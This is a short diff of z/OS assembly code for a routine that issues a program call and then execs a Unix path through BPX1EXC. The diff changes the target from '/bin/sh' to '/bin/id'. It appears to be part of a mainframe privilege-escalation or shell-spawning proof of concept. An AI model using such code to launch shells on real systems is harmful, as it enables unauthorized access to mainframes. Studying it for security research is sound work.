@@ -17,7 +17,7 @@ PCEXC    CSECT
 ***********************************************************************
 *    SET UP BPX1EXC
 ***********************************************************************
-         LA    R0,56           
+         L     0,BPXNUM          
          LA    1,FULLARG  
          LA    7,PATHLEN
          ST    7,0(,1)         # store it's addr in first slot
@@ -51,9 +51,10 @@ ENDPROG  LM    R14,R12,SAVE
 ***********************************************************************
 PCNUM    DC    XL4'00001301'
 SECOND   DS    XL4
+BPXNUM   DC    XL4'00000038'
 SAVE     DS    18F
 PATHLEN  DC    F'7'            
-PATH     DC    C'/bin/sh'      
+PATH     DC    C'/bin/id'      
 FZERO    DC    F'0'            
 * shell vars
          DS    0F
@@ -62,6 +63,5 @@ FULLARG  DS    A
 ***********************************************************************
 *    MACROS
 ***********************************************************************
-         CVT DSECT=YES
          YREGS
          END   PCEXC 
